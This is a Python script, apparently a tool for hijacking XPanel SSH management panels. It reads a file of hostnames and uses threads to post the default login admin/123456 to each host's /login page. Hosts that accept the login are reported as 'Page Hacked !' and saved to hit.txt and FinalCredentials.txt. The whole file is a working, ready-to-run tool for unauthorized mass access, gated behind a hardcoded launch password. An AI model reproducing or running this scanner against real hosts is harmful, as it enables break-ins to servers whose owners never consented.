# Author : S3NAT0R
# Date : 2023-July-8
# Description : Console App Checker XPanel SSH
import argparse
import json
import random
import requests as rq
import os
import warnings
from art import *
from colorama import Fore, Back
import logging
from json.decoder import JSONDecodeError
import pathlib
from bs4 import BeautifulSoup, MarkupResemblesLocatorWarning
import queue
import sys
import threading
import time
import pwinput
from loguru import logger

# format string for Loguru loggers
LOGURU_FORMAT = (
    " <level>{level: <2}</level> | "
    "<level>{message}</level>"
)


class checker(threading.Thread):

    def __init__(
            self,
            jobs: queue.Queue,
            valid_credentials: list,
            break_on_success: bool = False,
    ):
        threading.Thread.__init__(self)
        self.jobs = jobs
        self.valid_credentials = valid_credentials
        self.break_on_success = break_on_success
        self.running = False

    def run(self):
        self.running = True
        while self.running is True:

            # if break on success is set and a valid credential
            # has already been found, stop the thread
            if self.break_on_success is True and len(self.valid_credentials) > 0:
                self.running = False
                break

            try:
                hostname, timeout = self.jobs.get(False)
            except queue.Empty:
                time.sleep(0.1)
                continue

            try:
                url = f"http://{hostname}/login"
                data = {'username': 'admin', 'password': '123456', 'submit': 'sumbit'}
                res = rq.post(url=url, data=data, timeout=timeout)  # Post Data
                warnings.filterwarnings('ignore', category=UserWarning, module='bs4')
                warnings.filterwarnings("ignore", category=MarkupResemblesLocatorWarning)
                soup = BeautifulSoup(res.text, 'html.parser')
                title_tag = soup.title
                if res.status_code == 200 and title_tag is not None:

                    title_text = title_tag.text
                    if title_text == 'Xpanel':
                        print(Fore.GREEN + f" [+]. Page Hacked !      ~>  {hostname} " + Fore.WHITE)
                        open("hit.txt", "a").write(f"{hostname}\n")
                        self.valid_credentials.append(hostname)
                    elif title_text == 'Login | XPanel':
                        print(
                            Fore.YELLOW + f" [!]. Page login Failed    " + Fore.WHITE + "|" + Fore.YELLOW + f" {hostname}" + Fore.WHITE)
                        open("wrong_pass.txt", "a").write(f"{hostname}\n")
                    else:
                        pass
                else:
                    pass
            except rq.Timeout:
                print(
                    Fore.RED + f" [-]. Error 404 Or TimeOut " + Fore.WHITE + "|" + Fore.RED + f" {hostname}" + Fore.WHITE)
                # self.jobs.put((hostname, timeout))
            except rq.ConnectionError:
                print(
                    Fore.MAGENTA + f" [*]. Panel Not Exist      " + Fore.WHITE + "|" + Fore.MAGENTA + f" {hostname}" + Fore.WHITE)
            except rq.RequestException as e:
                pass
            else:
                pass

            self.jobs.task_done()

        return super().run()

    def stop(self):
        self.running = False
        self.join()


def parse_arguments() -> argparse.Namespace:
    """
    parse command line arguments

    :rtype argparse.Namespace: namespace storing the parsed arguments
    """

    parser = argparse.ArgumentParser(
        prog="v2ray",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
        add_help=False,
    )
    parser.add_argument("--help", action="help", help="show this help message and exit")
    parser.add_argument("-t", "--threads", help="number of threads to use", default=5, type=int)
    parser.add_argument("-h", "--hostname", type=pathlib.Path, help="hostname file path", required=True)
    parser.add_argument("--timeout", type=int, help="timeout", default=6)
    parser.add_argument("-b", "--break", help="break upon finding a valid credential", action="store_true", )

    return parser.parse_args()


def main() -> int:
    # clear Screen
    os.system("cls")
    # disable built-in logging so paramiko won't print tracebacks
    logging.basicConfig(level=logging.CRITICAL)

    # remove built-in logger sink
    logger.remove()

    # add custom logger sink
    logger.add(sys.stderr, colorize=True, format=LOGURU_FORMAT)

    try:
        # parse command line arguments
        args = parse_arguments()

        # verify argument validity
        try:
            assert args.threads >= 1, "number of threads must >= 1"
            assert args.hostname.is_file(), "hostname file does not exist"
            assert args.timeout >= 0, "timeout must >= 0"
        except AssertionError as error:
            logger.error(error)
            return 1

        # initialize variables
        mx_size = 0  # set max size for Memory leak
        thread_pool = []
        jobs = queue.Queue(maxsize=mx_size)
        valid_credentials = []

        rgb = [Fore.GREEN, Fore.BLUE, Fore.CYAN, Fore.RED, Fore.MAGENTA]
        rnd_RGB = random.choice(rgb)
        _Banner_ = text2art("S3NAT0R")
        print(rnd_RGB + "\n" + _Banner_ + Fore.WHITE)
        print("==================================================")

        pswd = pwinput.pwinput(prompt=" Please enter Password: " + Fore.YELLOW, mask='●')
        correctPassword = "s3nat0r!@123"
        attemp = 1

        while pswd != correctPassword:
            attemp += 1
            if attemp == 4:
                sys.exit(0)
            else:
                pswd = pwinput.pwinput(
                    prompt=Fore.WHITE + " Enter password again (" + Fore.RED + f"{attemp}" + Fore.WHITE + "):" + Fore.YELLOW,
                    mask='●')
        print(Fore.WHITE + "==================================================")

        # get count ips
        try:
            c_ip = 0
            with open('ip.txt') as fp:
                for line in fp:
                    if line.strip():
                        c_ip += 1
        except OSError as e:
            print(Fore.YELLOW + ' [#]. Unfortunately, the IP list is empty.' + Fore.WHITE)

        cIP = c_ip  # Count IP Numbers
        print(Fore.WHITE + "\n All " + Fore.CYAN + "IP" + Fore.WHITE + " Detected : [" + Fore.GREEN + str(
            cIP) + Fore.WHITE + "]\n")

        # create threads
        print("==================================================")
        logger.info(f"Launching {args.threads} brute-forcer threads")
        for thread_id in range(args.threads):
            thread = checker(jobs, valid_credentials)
            thread.name = str(thread_id)
            thread.start()
            thread_pool.append(thread)

        # read usernames and passwords from file
        with args.hostname.open("r") as hostname_file:
            hostnames = hostname_file.readlines()
        # add username and password combinations to jobs queue
        logger.info("Loading usernames and passwords into queue")
        print("==================================================\n")
        for hostname in hostnames:
            jobs.put(
                (
                    hostname.strip(),
                    args.timeout,
                )
            )

        try:
            while not jobs.empty():
                for thread in thread_pool:
                    if not thread.is_alive():
                        pass
                        # logger.error(
                        #    f"Thread {thread.name} exited early with errors",
                        #    file=sys.stderr,
                        # )

                for thread in thread_pool:
                    if thread.is_alive():
                        break
                else:
                    break

        except (SystemExit, KeyboardInterrupt):
            logger.warning("Stop signal received, stopping threads")

        finally:
            for thread in thread_pool:
                thread.stop()

            for thread in thread_pool:
                thread.join()
        print("\n==================================================")
        print(
            Fore.GREEN + f"Brute-force completed ! " + Fore.CYAN + f"[ {len(valid_credentials)} ]" + Fore.GREEN + " valid Panel found" + Fore.WHITE)

        print("==================================================")
        for hostname in valid_credentials:
            open("FinalCredentials.txt", "a").write(f"{hostname}\n")
        return 0

    except Exception as error:
        # logger.exception(error)
        logger.exception(f"Exception Error : (Section Thread)")
        return 1


# launch the main function if this file is ran directly
if __name__ == "__main__":
    sys.exit(main())
